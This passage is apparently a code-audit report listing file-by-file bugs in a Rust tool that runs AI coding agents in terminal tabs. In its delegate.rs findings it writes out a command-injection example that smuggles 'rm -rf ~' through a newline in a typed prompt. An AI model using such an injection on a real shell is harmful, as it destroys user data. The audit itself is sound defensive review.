yields light=1 and y=-0.5, a bar outside the cell) and :195 returns a fixed [Rect;4] whose unused tail is Rect::default() — a caller that drops the `n` paints up to four 0x0 quads at the origin with no compiler help

### `src/briefs.rs`

briefs.rs:95-102+117 a misspelled front-matter key is accepted, kept, and then silently NEVER applies: parse_front_matter takes any 'k: v' line, parse_brief only looks up 'basedir', so 'baseDirs:', 'base_dir:' or a stray leading space produces a Brief with empty base_dirs and always=false — specificity() returns None everywhere, load_all still pushes it (body non-empty), and the session gets nothing with no warning at any layer; cli/brief.rs:68 only reveals it as an empty baseDir list, and only if the user thinks to run --list; briefs.rs:152-153+199 the documented precedence ('machine-wide first so a user's own briefs sort after and read as the later word') is NOT implemented — select() tiebreaks equally-specific briefs on the full source PATH STRING, so it holds only by the lexicographic accident that '/etc' < '/home'; with XDG_CONFIG_HOME=/data/... (or any config base sorting before /etc) the user's brief lands FIRST and the machine-wide one becomes the later word, exactly inverting the stated rule — the tiebreak needs an explicit source-dir rank; briefs.rs:39+217 MAX_TOTAL is documented in CHARACTERS but every measurement is body.len(), i.e. BYTES: for the accented French prose this repo's author writes, the real budget is silently 20-40%% smaller than the 6000 advertised; briefs.rs:209-241 cap is not a cap — the '(N more ... omitted)' note is appended AFTER the budget check so the result overshoots by ~60 chars, and a single brief larger than cap is emitted whole (deliberate per the test at 346-348, but the doc at 34-39 reads as a hard limit); briefs.rs:62 baseDir is matched raw with no normalisation: a relative baseDir never matches an absolute cwd, '..' segments are not resolved (Path::starts_with is purely component-wise), and a symlinked cwd fails to match its real target — all three fail SILENTLY, indistinguishable from 'no brief configured'; briefs.rs:124-127 'always' accepts only true/yes/1 while agent_probe::parse_bool in the same crate also accepts 'on'/'off' — 'always: on' silently evaluates false; briefs.rs:180 a file that is nothing but front matter is dropped with no diagnostic, and cli/brief.rs:68 then reports a 'brief file(s) loaded' count that excludes it, so the user sees a number that disagrees with their directory listing; briefs.rs:209-241 render concatenates bodies with a bare blank line and no attribution — /etc/tab-atelier/briefs (machine-wide, potentially another admin's) and ~/.config briefs are injected into the agent's context indistinguishable from each other and from the built-in brief, so nothing lets an agent weigh a system-wide instruction differently from the user's own; briefs.rs:245-248 for_cwd re-runs both read_dirs and re-reads+re-parses every .md on every call, i.e. once per tab at session start, with no caching and no per-file size limit

### `src/catbus_agent.rs`

catbus_agent.rs:231 the mtime read uses ok()? INSIDE the per-entry loop of a function returning Option, so ONE unreadable or just-deleted .jsonl aborts the entire directory scan and newest_session returns None — the tab's whole agent session (transcript, LED, /catbus endpoints) disappears because of an unrelated file, instead of that entry being skipped; catbus_agent.rs:221-237 the session is chosen by newest mtime across every .jsonl in the project dir, but transcripts are appended to continuously, so two agent tabs running in the SAME cwd (the normal case for a fleet working one repo) flip the selection back and forth on every tick and each tab intermittently serves the other's conversation — the per-tab agent_session_id the daemon already persists is never consulted here; catbus_agent.rs:132+192 the child walk reads only /proc/PID/task/PID/children, i.e. the main thread's children; a process that forked the agent from a non-main thread has its descendants listed under a different tid and is therefore invisible to both find_agent_descendant and agent_activity_with_pid, which report Gone and cause apply_sweep_activity to clear a live agent's LED and session; catbus_agent.rs:126+180 both loops use queue.pop(), which is depth-first, while the doc comments at :108 and :162 both say BFS — this is not cosmetic for find_agent_descendant: when a tab has nested agent processes (a claude that spawned a claude) DFS returns the deepest-last match rather than the shallowest, and :73 then resolves the transcript from THAT process's cwd, silently binding the tab to the wrong session; catbus_agent.rs:419-472+425 send_prompt_to_socket is not bounded by the '10-minute ceiling' its comment claims: the timeout is a per-read_line timeout that RESETS on every successful read, so an agent emitting one chunk frame every nine minutes holds the API thread forever; the greeting read at :434 is covered by the same 10-minute timeout, so merely connecting to a socket that accepts and never speaks pins a thread for ten minutes; and :426-427 discard the set_read_timeout result, so if it fails the read blocks with NO ceiling at all — N concurrent POSTs to /catbus/message pin N threads of a thread-per-connection server; catbus_agent.rs:453 one malformed line aborts the whole exchange with an error even though the loop is documented at :440-442 to ignore frame kinds it does not know — a single stray non-JSON line on the socket fails a request that was otherwise about to succeed; catbus_agent.rs:293-332 the doc at :289-292 says the since parameter avoids a full-file re-allocation per poll, but every line is still read, JSON-parsed and turned into allocated MessageSegment Strings before being dropped at :322 — the skip only avoids the final push, so the mobile remote's incremental polls still fully parse a multi-megabyte transcript every tick; catbus_agent.rs:314-318 a user turn whose content is a bare string is rendered verbatim as a chat bubble with no filtering, so the system-injected turns (system-reminder, task-notification, command expansions) that cli/claude_hook.rs:120-123 goes out of its way to detect and suppress are shown to the mobile remote as if the human typed them; catbus_agent.rs:183-187 the UID guard reads comm first and proc_uid second, a TOCTOU window on pid reuse, though it does fail closed when proc_uid('self') itself fails; catbus_agent.rs:532+558 the two parse tests build predictable paths under std::env::temp_dir() keyed only by pid, never clean up (every cargo test run leaves ta-catbus-test-*/s.jsonl behind) and reuse a guessable name even though the repo already depends on tempfile and uses tempdir() elsewhere; :492 asserts Gone by walking the real test process's /proc subtree, so the assertion depends on nothing in the harness ever being named claude

### `src/cgroup.rs`

cgroup.rs:320-332 terminate_tab feeds the pids straight from cgroup.procs into kill(1) with NO guard, while parse_cgroup_procs deliberately KEEPS a 0 line — the modules own test asserts it (:431 parse_cgroup_procs("0\\n-1\\n2a\\n3") == [0, 3]) with the comment "the callers guards handle 0", but terminate_tab is a caller and never calls unsafe_tab_pid: kill -s TERM 0 signals the CALLERS ENTIRE PROCESS GROUP, i.e. the daemon and every tab, and this runs on the ordinary tab-close path (headless.rs:1192); a 1 line would likewise be forwarded; cgroup.rs:343-365 reap_stale_tabs SIGKILLs every tab-* cgroup under the delegated base at startup with no ownership check at all — no pid/boot/instance marker, nothing that distinguishes "left over from a prior run" from "belongs to the instance that is running right now", so a systemd restart that overlaps with the outgoing process, or any second daemon resolving the same delegated base, atomically kills the other ones live tab subtrees; cgroup.rs:96-131 setup() mutates whatever cgroup the process happens to be in, with no check that it is actually our own delegated unit subtree — it creates supervisor/, moves the process into it and writes +memory/+cpu/+pids into that parents cgroup.subtree_control; the GUI calls this too (app.rs:932), so a desktop binary launched from a terminal does this to the TERMINALS scope, where other processes still sit directly in the cgroup and the no-internal-processes rule makes the subtree_control write fail (silently, since every write is let _ =) — limits then appear enabled while no controller is actually delegated; cgroup.rs:126-128+120 the controller enables are ignored individually AND collectively, so init logs "per-tab resource limits enabled" and returns Some(base) even when not one controller could be turned on: every later memory.max/cpu.max/pids.max write fails silently at :158-166 and the tab is unlimited while the daemon reports success; cgroup.rs:381-392 sanitize_id maps every non [A-Za-z0-9_-] char to _, so two distinct tab ids can resolve to the SAME tab-<id> directory — and kill_tab/cgroup.kill on one then SIGKILLs the other tabs entire subtree; nothing validates the id as a uuid; cgroup.rs:138-177 vs 262-266 apply() returns early when limits.is_empty(), so for a limitless tab only ensure_tab creates the cgroup — but ensure_tab is gated not(feature="gui"), meaning the GUI never puts a limitless tab in a cgroup at all; the doc at :253-261 ("EVERY tab gets its own cgroup ... so its whole process subtree can be reliably torn down") is true only for the headless build, and the GUI keeps exactly the orphan problem the comment describes; cgroup.rs:89-92 init ignores the OnceLock::set result and takes a wanted flag no caller ever passes false (headless.rs:886, app.rs:932 both pass true) — the gate is dead API, and because the first set wins, a later init can never turn limiting on if the first one resolved None; cgroup.rs:105-113 the writability probe creates tab-atelier.probe and removes it best-effort, so a crash between the two leaves a stray cgroup that reap_stale_tabs will not clean (it only matches tab-*); cgroup.rs:276-286 kill_tab returns whether the cgroup.kill WRITE succeeded, not whether anything died, and it removes the dir immediately — the code comments acknowledge the rmdir race but the boolean is still used by callers as "the tab was killed"

### `src/claims.rs`

claims.rs:221-224 a claims.json that is truncated or unparsable is swallowed by .ok()/unwrap_or_default(), silently resetting the WHOLE lease table and next_fence to 0 — that directly breaks the invariant stated at 87-88 (fences must never repeat), because post-reset fence 1 compares equal to a pre-crash fence 1 held by a stalled agent; claims.rs:241 the persist is a plain std::fs::write with no temp+rename, so a crash or a concurrent reader mid-write is exactly how that truncated file gets produced, and the write error is discarded (let _ =) so a read-only state dir means fences silently replay from 1 on the next restart — the comment at 239-240 frames this as merely 'leases work in memory', which understates it; claims.rs:19-21 vs 118-149 the headline fencing is never actually enforced anywhere in this module — neither grant nor release takes a fence argument, both compare only the opaque caller-supplied holder string (passed straight through from the request in api/claims_route.rs:36), so two tabs that share a name, or one that spoofs holder, defeat mutual exclusion outright; claims.rs:191/197 PATH_OVERRIDE uses if-let-Ok / .ok() while REGISTRY at 219 uses PoisonError::into_inner, so on a poisoned lock set_registry_path silently no-ops and registry_path falls back to the REAL state dir — a test would then write to the developer's ~/.local/state, the one thing the doc at 188-189 promises cannot happen; claims.rs:182+220 set_registry_path does not invalidate the cached REGISTRY, which is loaded once per process, so calling it after any with_registry leaves the old contents loaded and then persists them to the new path; every caller must pair it with reset_for_test, which is #[cfg(test)]-only, so the 'ops override' half of the doc at 184-185 has no working path; claims.rs:132 a renewal overwrites granted_ms with now, so original acquisition time is unrecoverable after the first refresh and a watchdog looking for a stuck holder only ever sees a freshly-granted claim; claims.rs:145 release requires live_at, so a holder whose lease lapsed but whose key nobody retook cannot release its own stale entry and it lingers until the next gc — release returns false where the caller reasonably expects true (cli/work.rs:173 discards it); claims.rs:228-229 gc() runs before the 'before' snapshot, so a pure-read call gcs in memory but is never persisted and on-disk claims.json accumulates lapsed entries until some unrelated mutation rewrites it; claims.rs:219 with_registry always takes the RwLock in WRITE mode plus a full deep clone of the registry for change detection, even for read-only closures (api/fleet_route.rs:38, api.rs:1888 both just call active()), so listing serialises against every grant; claims.rs:212-218 the same three-line comment is pasted twice; tests cover Registry in isolation only — the entire I/O half (182-251: load, corrupt-file handling, persist, path override) has no test, and the reload test at 388 round-trips serde in memory rather than through the file

### `src/cli/await_task.rs`

cli/await_task.rs:149-151+182 Unknown-first turns every read failure and every propagation delay into 'no such task': read_blackboard (team.rs:454-456) swallows all IO errors with unwrap_or_default, so a missing state dir, a permissions problem, or a wrong HOME yields an empty board and exit 4 for ids that exist — and the same rule fires for a task that was announced microseconds ago or on another host and has not landed in the local file yet, which is exactly the shell idiom the module doc advertises at :24; there is no grace poll or single retry before declaring a typo, so the verb whose entire job is waiting refuses to wait in the one case where waiting is the right answer; cli/await_task.rs:178-180 the deadline is Instant::now() + Duration::from_secs(timeout_s) with no bound on the parsed u64, so 'wait t --timeout 18446744073709551615' PANICS on Instant addition overflow — a panic reachable from a single user-supplied number; cli/await_task.rs:181-211 with no --timeout the loop blocks forever, and an awarded task whose holder died is never terminal: the lease in claims.rs expires but nothing on the board marks the task failed, so wait cannot distinguish 'in progress' from 'abandoned' and its DEFAULT behaviour on a dead agent is to hang indefinitely — the exit-code table at :13-21 has no state for it; cli/await_task.rs:184-186+210 expired is evaluated before an unconditional 500ms sleep and never bounds the sleep by the time remaining, so the effective timeout is rounded up to a multiple of POLL (--timeout 1 can return after ~1.5s) — harmless alone but it means the timeout is not the contract the doc states; cli/await_task.rs:192-205 the Pending printout classifies an id that is NOT on the board as 'still running' (is_none_or), the exact opposite of the Unknown-first policy at :149 — dead code today only because Unknown returns earlier, but the two branches encode contradictory answers for the same input and will diverge the moment either is edited; cli/await_task.rs:170+182 every poll re-reads AND re-folds the whole append-only blackboard, so the doc's claim at :26-27 and :53-54 that 'a hundred parallel waiters are a hundred cheap reads' is O(board) per waiter per 500ms and degrades as the board grows — asserted in prose, never measured or bounded; cli/await_task.rs:296-304 the only test that exercises run() reads the DEVELOPER'S REAL blackboard with no tempdir or state-dir override (contrast cli/work.rs:446 which sets one up), so it touches real state during cargo test and silently depends on 'definitely-not-a-task' never appearing on it; the polling loop, the deadline arithmetic, the Pending printout and the --any timeout interaction have no coverage at all — only the two pure functions do

### `src/cli/backlog.rs`

backlog.rs:277-288 there is no rotation: the doc at :247-248 and the CoveragePolicy field at :217 both promise 'a rotation of audits over the largest ones', but the code sorts every file by size and takes the top `audit_largest` deterministically on every sweep — the same two files are proposed forever, and once they cool out of the 30-day window they come straight back, so every file below the top N is audited never; backlog.rs:277 that audit list is also built from `files.iter()` unfiltered, ignoring min_lines and every coverage filter, so a generated or vendored file that was deliberately excluded from cov: tasks is still put up for audit; backlog.rs:191-201 the cooldown is keyed off `t.last_ts` — the timestamp of the LAST note of any kind on the task, not of the completion — so any later note (a bid, a stray award, a comment) on a finished task pushes last_ts forward and re-extends the cooldown; a task that keeps attracting chatter can never be re-announced even though it finished a month ago; backlog.rs:141-162 parse_lcov silently discards a trailing SF: record that has no `end_of_record` (a truncated or in-progress report loses its last file), and both the LF:/LH: parses at :150+:154 swallow failures — a malformed `LF:` line leaves lines_found at 0, percent() then returns 100.0 by design (:111-113), and the file is treated as perfectly covered and never announced; a coverage report corrupted mid-write silently shrinks the backlog instead of erroring; backlog.rs:85-96 run_source calls Command::output() with no timeout and no output limit: a source that hangs (a pipeline waiting on stdin, a network fetch) blocks the whole sweep indefinitely, and one that streams (`yes`) buffers unbounded stdout into memory — this is the timer-driven path, so neither failure mode is recoverable without killing the daemon; backlog.rs:381+389 --target parses as f64 with no validation and `\"NaN\"\"\"/\"inf\"/negative all parse successfully: with --target NaN the `f.percent() < target` filter at :172 is false for every file and lines_to's cast yields 0, so the command exits 0 having announced nothing, reporting a healthy no-op instead of a bad argument; --limit and --audit-largest are likewise unbounded usizes; backlog.rs:242-245 relative_to falls back to the raw path whenever strip_prefix fails — a --root given with a trailing slash, through a symlink, or containing `..` silently produces absolute task ids, which is exactly the cross-checkout duplication the function's own doc (:236-240) says it exists to prevent, and nothing warns; backlog.rs:448-477 the exit code conflates outcomes: `i32::from(had_error)` returns 1 for 'one source broke but everything else was announced' and :473 returns the same 1 for 'the blackboard write failed', while :473 also bails mid-batch leaving a partially-announced board with no summary of which ids landed; backlog.rs:364-367 the unknown-flag check runs only at :390, AFTER value() has already consumed the following argument, so a stray token in the last position is reported as '<token> expects a value' rather than 'unknown argument', and a misplaced --dry-run after --from is swallowed as part of the shell command; backlog.rs:55-74 candidate ids are never validated: a source emitting an id that begins with '-' (easy from an `rg`/`sed` pipeline) announces a task that `tab-atelier done <id>` then parses as a flag, and run_source's from_utf8_lossy at :95 turns non-UTF8 bytes into replacement chars, so the 'stable across runs' id contract at :40-42 quietly breaks

### `src/cli/bench.rs`

bench.rs:318 the headline 'mean' is an ARITHMETIC mean of per-case MiB/s, which is the wrong aggregate for rates — the correct one is total-bytes/total-time (harmonic). As written the fastest case dominates: scrolling at ~2000 MiB/s and a slow case at 100 MiB/s average to ~1050, so halving the slow case moves the mean by ~2% and the regression the module exists to catch (:18) hides inside the summary number; bench.rs:261 target = mb * 1024 * 1024 with --mb bounded only by n >= 1 (:206), so the multiply wraps silently in release for large values and the bench then reports a throughput figure computed over a near-empty payload instead of erroring; short of wrapping, a plausible typo like --mb 640000 sends Vec::with_capacity into an allocation failure, which in Rust ABORTS the process rather than returning an error — no upper bound anywhere; bench.rs:299-302 the allocation count and the timing printed on the same row come from DIFFERENT runs: drain_allocs is captured only on iter 0 while best is the min across all iterations, so when iteration 0 is the cold/slowest one (the usual case) the row pairs a discarded run's alloc count with another run's time. The comment at :277-278 claims 'ONE representative drain' without noting it is not the one reported; bench.rs:102-111 payload_cursor_motion hardcodes the row bounce to 1..24 while the grid defaults to --rows 50 and is user-settable, so the case most sensitive to grid height ignores the flag entirely — raising --rows leaves the bottom of the grid untouched and the payload stops being representative of the configured terminal; bench.rs:175-185 drain takes term.lock() on a FairMutex once per 4 KiB chunk with zero contention, whereas in a live tab that same lock is contended by the render thread. The module doc lists its caveats carefully at :13-19 but omits this one, so the number systematically overstates what a real tab achieves; bench.rs:17+324 the doc sells this as 'a reproducible, CI-trackable number' yet run() returns 0 unconditionally, emits only a formatted human table with no JSON or machine-readable mode, and has no baseline or threshold — CI can only regex-scrape column text and can never fail a build on a regression; bench.rs:304-305 secs comes from best.as_secs_f64() and is divided into the byte count with no zero guard, so a sub-nanosecond drain yields inf MiB/s which then poisons the mean at :318 into inf; bench.rs:124-126 the doc claims 'only printable ASCII 0x21..0x7e is emitted, never a control byte, so the parser stays on its plain-print fast path', but every line is terminated with the CR LF written at :143 — the payload does contain control bytes and the claim as stated is false; bench.rs:177-178 Instant::now() is taken before vte::ansi::Processor::new(), so parser construction is inside the timed region for every case; bench.rs:263 the banner prints '{mb} MiB/case' while every builder overshoots the target (a whole line for scrolling/unicode, ~203 bytes for paste_random, a variable SGR run for sgr_dense) — the math correctly uses payload.len() at :274, but the reported size does not match the measured size; bench.rs:67-84 payload_sgr_dense does a format! allocation per CELL, roughly 3 million of them to build a 64 MiB payload, making bench startup dominated by payload construction for the one case that needs it least

### `src/cli/bench_lag.rs`

bench_lag.rs:112-114 the probe nonce is 'q{sample:03}z' and is TYPED INTO A LIVE TAB, but q is the quit key in less, more, man, top and htop — pointing bench-lag at a tab sitting in a pager kills the pager, and in vim/Claude Code's TUI the five bytes are five commands, not text. The sibling module bench.rs:117-121 goes out of its way to make its payload inert by construction ('Bash-safe: every line is prefixed with # ...'); this one actually injects keystrokes into a real session and does no such analysis, and its test at :255-261 only asserts the nonce is alphanumeric and unique, never that it is harmless; bench_lag.rs:212-217 the erase is a fixed probe.len() backspaces sent unconditionally — including when the echo TIMED OUT, so the code has no idea how many characters actually landed — and 0x7f only deletes in a line editor. The doc's claim at :10-11 that 'the prompt line is left unchanged' holds only for a plain echoing shell, which is exactly not what this app's tabs usually run; bench_lag.rs:40-41 + :177-180 the https-to-wss conversion is implemented and has its own passing test (:286-291), yet set_read_timeout refuses every TLS stream and the run exits 1 with 'use the ws:// URL' — so the obvious workflow, pasting the browser's https viewer URL, always fails at runtime. The module doc at :21-22 says ws:// only while the converter and its tests advertise the opposite; bench_lag.rs:169 the full WebSocket URL is echoed to stderr including its ?token=<share token>, so the credential lands in the tab's persisted scrollback and in any CI log that captures the run; bench_lag.rs:74-79 + :183 since=0 forces the server to replay the ENTIRE ring on connect — for a 4 MiB tab that means inflating the whole cold section (pty_ring since(0)) and shipping megabytes — which the client then throws away in drain(). The benchmark begins by making the server perform its single most expensive operation, and the residue perturbs the first samples; using the current total_len as the bootstrap offset would cost nothing; bench_lag.rs:197-205 'echoed' accumulates every TAG_OUT payload for the whole 2 s window with no cap, and contains_seq re-scans the entire accumulated buffer after every frame — O(n^2) in bytes received. On a tab that is streaming (a build printing) this burns CPU inside the measurement loop and so distorts the latency it is measuring; bench_lag.rs:237 the percentile uses floor(q*n) as the index, which overstates by one rank: for n=20 the 'median' is the 11th of 20 rather than the middle, and p95 of 25 samples is really the 96th percentile. Nearest-rank needs ceil(q*n)-1, and these five numbers are the module's entire output; bench_lag.rs:140-144 + :185 --samples has no lower or upper bound: 0 is accepted and produces the misleading 'no samples captured — check the tab/token' diagnosis at :226-232 for what is simply a request for zero samples, while a large value goes straight into Vec::with_capacity and aborts the process on allocation failure; bench_lag.rs:222 run returns 0 unconditionally, so a run that captured nothing at all still exits successfully and no CI check can fail on it; bench_lag.rs:102-106 drain reads until ANY error, conflating the intended read-timeout with a real connection close or protocol error, and it swallows Close frames rather than completing the close handshake — a dropped connection just ends the run quietly at the next send (:193-194)

### `src/cli/brain.rs`

brain.rs:696-715 the TICK_BUDGET check sits AFTER the fetch-error 'continue' at :699, so every failed /output fetch skips the budget test entirely — with N dead or unreachable tabs a tick runs N x 3s (the share_link agent timeout) instead of the advertised 4s, blowing straight past the 5s poll interval the budget exists to protect; brain.rs:771-791 all the nudge bookkeeping (nudged_hash, nudge_streak, last_label, next_nudge_at) is committed BEFORE the POST, and the POST propagates with ?, so a send that fails — daemon restarting, tab locked (423), tab closed (404) — still burns a backoff step and marks the screen as already-nudged: the tab then waits up to 900s for a continue it never received, and the single failure aborts the whole tick for every other tab too; brain.rs:723+713 the circuit breaker counts entries in 'eligible', but 'eligible' is itself truncated by TICK_BUDGET — on a large fleet the scan stops early, capped can never exceed CIRCUIT_BREAKER_THRESHOLD=5, and the breaker never engages in exactly the big-fleet outage it was written for; brain.rs:485-487 the AgentError trigger fires with no pattern at all, and agent_state is set by set-status from INSIDE the tab's PTY, so anything the agent runs can flag its own tab and get continue\\r typed into it; nothing ever clears agent_state, so a dead tab stuck at 'error' is nudged forever — the nudged_hash guard only blocks an UNCHANGED screen, and each nudge changes the screen, re-arming eligibility; brain.rs:176-180 'Internal server error', and likewise ECONNRESET / ETIMEDOUT / 'Connection refused', are generic strings that appear routinely in build logs, HTTP traces and test output the agent is merely READING. The claude-only filter at :651-659 is justified in its own comment by precisely this hazard ('git log showing ECONNRESET') but only excludes non-Claude tabs — a Claude tab running git log has the identical problem, completely unmitigated; brain.rs:262-277 scan_output returns the first entry in PATTERNS order, not the latest occurrence in the text, so a stale generic 'Internal server error' earlier in the tail outranks a fresher, more specific '529 Overloaded' later in it — which then mislabels the episode and spuriously resets the backoff streak as the tail scrolls; brain.rs:112-126 probe_once accepts ANY 2xx as online, which inverts captive-portal detection: a portal's 200 login page is the exact signal that traffic is being intercepted, and Google's generate_204 endpoint means what it says — accepting 200 makes brain believe a portal-trapped box is online and burn backoff steps for the duration; brain.rs:816-824 crash_log never creates the parent directory (OpenOptions::create makes files, not dirs), so on a fresh install the crash log silently writes nothing in exactly the early-crash case it exists for; it also hardcodes the literal "tab-atelier" rather than crate::APP_DIR, and has no size cap — a per-tick panic (the broken-pipe println the comment names is itself a panic) loops forever appending unboundedly; brain.rs:427-432+680 has_cached is !cached_tail.is_empty(), so a tab whose output is legitimately empty never counts as cached and is re-fetched in full every tick, defeating the CRC optimisation for the cheapest tabs; brain.rs:704-709 the eligibility hash is captured during a scan that may run seconds before the send at :786, with no CRC re-check — an agent that recovered on its own in that window gets a spurious continue\\r injected mid-turn; brain.rs:491-494 recovery resets nudge_streak/last_label but never nudged_hash, so a tab that recovers and later returns to the byte-identical screen it was once nudged at is permanently ineligible; brain.rs:915-916 --once returns 0 unconditionally, even when the tick returned Err or panicked, so the scriptable entry point can never report failure

### `src/cli/brief.rs`

9 findings, no code changed (full text in note --topic audit): worst is brief.rs:45,58 — --cwd is never made absolute, so 'brief --cwd .' matches no baseDir and prints a false 'no project brief matches' with exit 0, the exact failure the command exists to disprove; also --cwd swallows the next flag, --list ignores MAX_TOTAL so it lists briefs render() drops, an always:true brief lists as 'baseDir []' (reads as a parse failure), --json claims to be the hook's exact payload but skips should_brief, assembly is duplicated from claude_hook.rs:201-207 instead of briefs::for_cwd, is_dir() mislabels unreadable dirs, empty-cwd fallback, and --list/--json/matching-brief are untested

### `src/cli/claude_hook.rs`

cli/claude_hook.rs:145-146 both stdin failure paths are silent: read_to_string's Result is discarded and a malformed body becomes Value::Null via unwrap_or, so session_id ends up None and session-start POSTs WITHOUT --session — silently dropping the durable claude attachment that :191-192 says drives auto-resume — while the module header at :39-41 promises 'stderr gets a one-line note for debugging'; neither path prints anything, so the failure is invisible; cli/claude_hook.rs:211+224+137 the module's central invariant ('never exit non-zero, a non-zero hook can block Claude', :39-41 and :246-249) is broken three ways: println!/eprintln! PANIC on a closed stdout/stderr (EPIPE), which is a non-zero exit from the one place the brief is emitted; and :136-140 returns 2 outright when the event argument is missing, i.e. a mis-wired managed-settings.json entry can block every claude invocation on the box, which is exactly the failure mode the design is built to avoid; cli/claude_hook.rs:221 the notification label is payload['message'] passed through with no length bound, while the user-prompt path truncates to 200 chars at :179 for the same label field — a long notification becomes an unbounded label and relies entirely on the server's 2000-char cap the comment at :177-178 alludes to; cli/claude_hook.rs:73-83 vs :275-279 an operator override with no BRIEF markers is injected WHOLE (extract_brief falls back to the entire document at :60), and there is no size cap on that path — the 'this costs tokens in every session' assertion only guards the built-in constant, i.e. the one brief that cannot change, and not the one an operator can drop into /etc/tab-atelier/agent-brief.md; cli/claude_hook.rs:176 the guard only rejects a leading '--', so a prompt of exactly '-h' reaches set_context::run, matches its -h arm (set_context.rs:40-50), prints usage to stderr and sets no context at all — silently losing the label for that turn; cli/claude_hook.rs:202-208 a failing current_dir() silently skips the per-project brief with no note, so an agent in a project with a brief can start without it and nothing says why; cli/claude_hook.rs:164-188 the context side-channel fires BEFORE the event is validated at :223, which is harmless today only because unknown events hit the '_ => {}' arm — the two match statements over the same  string can drift; cli/claude_hook.rs:245-249 set_status::run's exit code is bound and then explicitly discarded, so a persistently unreachable daemon produces no signal anywhere the user will see beyond stderr Claude Code may not surface; tests cover only the pure helpers (extract_brief/brief_json/should_brief/is_nudge/is_synthetic_prompt) — run() and the event→(state,label,attachment) table at :214-227, which is the entire point of the module, have no test, so an event name renamed in managed-settings.json fails silently at :223-225 with exit 0

### `src/cli/client.rs`

client.rs:23 vs :81 the module doc explicitly lists `limit` among the arms that 'stay clap-native (absent here)', but line 81 maps \"limit\" => share_link::limit_cli — and the drift is real, not just documentary: dispatch.rs:785-800 handles Commands::Limit by calling share_link::limit/limit_default DIRECTLY with clap-typed args and never routes through client::run, while share_link.rs:1121+ is a second hand-rolled parser for the same flags; `limit` therefore has TWO independent argument parsers with independent validation, one per edition — precisely the two-lists-drift failure (:9-13) this file exists to eliminate, reintroduced inside it; client.rs:38+102 the `_ => return None` contract means that on the GUI edition (which per :16-17 calls dispatch on argv[1] and treats None as 'launch the app') any typo'd subcommand or `--help`/`-h` LAUNCHES THE FULL GUI instead of reporting an error: `tab-atelier takee`, `tab-atelier --help`, `tab-atelier tabss` all silently open a window, and there is no usage output anywhere on that path; client.rs:62 `peers` is the only arm that pre-parses its arguments — it reduces the whole of `rest` to one bool by scanning for `--all` — so every other argument is discarded before the handler sees it and team::peers (team.rs:107, signature `peers(all: bool)`) is structurally unable to reject anything: `tab-atelier peers --json`, `peers --nope`, `peers extra` all silently behave as bare `peers` and exit 0, while every sibling verb gets `rest` verbatim and can error; client.rs:55-56 `log` and `logs` are routed to two DIFFERENT modules (logging::run vs super::logs::run) with no comment marking them as distinct — a one-character typo silently runs a different command, and nothing in the table or the docs cross-references them; client.rs:107-118 the drift guard is a runtime eprintln on the unhappy path: it fires only when a user actually invokes a command whose clap arm forwards a name this table lacks, so the desynchronisation the module was written to prevent is still discovered by users rather than by a compile error or a test asserting the clap enum and this table agree; client.rs:116 that internal-wiring error also returns exit 2, the same code the ordinary verbs use for bad user input (work.rs, flags.rs), so a programmer error is indistinguishable from a usage error to any calling script; client.rs:99 \"settings\" is aliased onto share_link::ports, so `tab-atelier settings` — the name an operator would try for general configuration — silently lands in the ports editor, and the handler receives no indication of which alias invoked it, so its own usage/error text can only name one of the two

### `src/cli/delegate.rs`

delegate.rs:292+413-415 shell_single_quote escapes ' but NOT newline or CR, and the result is TYPED into a live shell over /input — the delimiter in this transport is the newline, not the quote, so a prompt containing \\n breaks out of the quoting the function exists to provide: `dispatch --new \$'do this\\nrm -rf ~'` types two lines and the shell executes the second as its own command; this is command injection through the path that looks safe, and control/ESC bytes are likewise typed raw at the terminal; delegate.rs:248-278 the new tab is identified by DIFFING the tab list before and after POST /tabs, so a concurrent creation by any other agent (which is exactly what this fleet does) makes `find` pick an arbitrary new id — the prompt is then typed into a stranger's tab; the API never returns the id it minted, so there is no non-racy way to do this; delegate.rs:292-293 the --new path always appends \\r and never consults o.submit, so the documented --no-submit flag (:72) is silently ignored whenever --new is used — the prompt is submitted against an explicit instruction not to; delegate.rs:99-108 --to/--prompt/--name/--cwd silently accept a MISSING value (take() returns None and the field stays None): `dispatch --new \"work\" --cwd` spawns the agent in the wrong directory and exits 0, and `--name` with no value silently skips the rename — a truncated command line succeeds with different behaviour instead of erroring; delegate.rs:111-120 --quiet/--timeout fail OPEN on an unparseable value, silently keeping the default while still consuming the argument, so `--timeout abc` waits 300s anyway and `--timeout --wait \"p\"` swallows --wait; sibling verbs (work.rs, backlog.rs) return exit 2 for the same mistake; delegate.rs:390-408 there is no validation of quiet/timeout either: --timeout 0 returns (last, true) on the first iteration, i.e. reports a TIMEOUT after ~2.75s of unconditional sleeps, and --quiet 0 declares the agent idle on the first poll; delegate.rs:291 a fixed 1500 ms sleep is used to guess that the new shell has printed its prompt, on a slow rc file or a cold home the launch line is typed too early and lost — the file's own doc at :311-322 explains at length why fixed delays are wrong and implements wait_for_paste_settled to replace them, then does not use it here; delegate.rs:394+398 vs :340+347 the two waiters take opposite error policies for the identical call: wait_for_paste_settled treats a failed output read as 'still settling' and continues, while wait_for_idle propagates it with `?` — so one transient HTTP hiccup 290s into a 300s wait aborts the whole dispatch and returns 1, discarding the completed work; delegate.rs:209+213 the exit code conflates outcomes: i32::from(timed_out) returns 1 for 'timed out, here is the screen' and the Err arm returns 1 for 'the wait failed', so no caller can tell a slow agent from a broken one; delegate.rs:268-277 a transient fetch_tabs failure inside the creation poll returns Err via `?` AFTER POST /tabs already succeeded, and :293 send_input failing does the same — both leave an orphaned tab running with no prompt, no cleanup and no mention of it in the error; delegate.rs:125 a positional prompt may not begin with '-' (the guard requires !starts_with('-')), so `dispatch --to x \"-v output is wrong\"` is rejected as 'unexpected argument' rather than taken as the prompt it plainly is

### `src/cli/dispatch.rs`

6 findings: 'shared client table' invariant broken (client::dispatch has 0 callers; list/ports aliases + bench-lag -n now unreachable; limit_cli/run_cli dead in prod; module docs in dispatch.rs+client.rs both list the wrong clap-native set); 17 subcommands print internal 'cli::work::tasks' paths as --help; set-font advertises a positional form clap rejects; note msg equal to --topic/--from eaten by downstream reparser; schedule/set-font/resize doc claims not clap-enforced; to_string_lossy corrupts non-UTF-8 paths on add/handoff

### `src/cli/flags.rs`

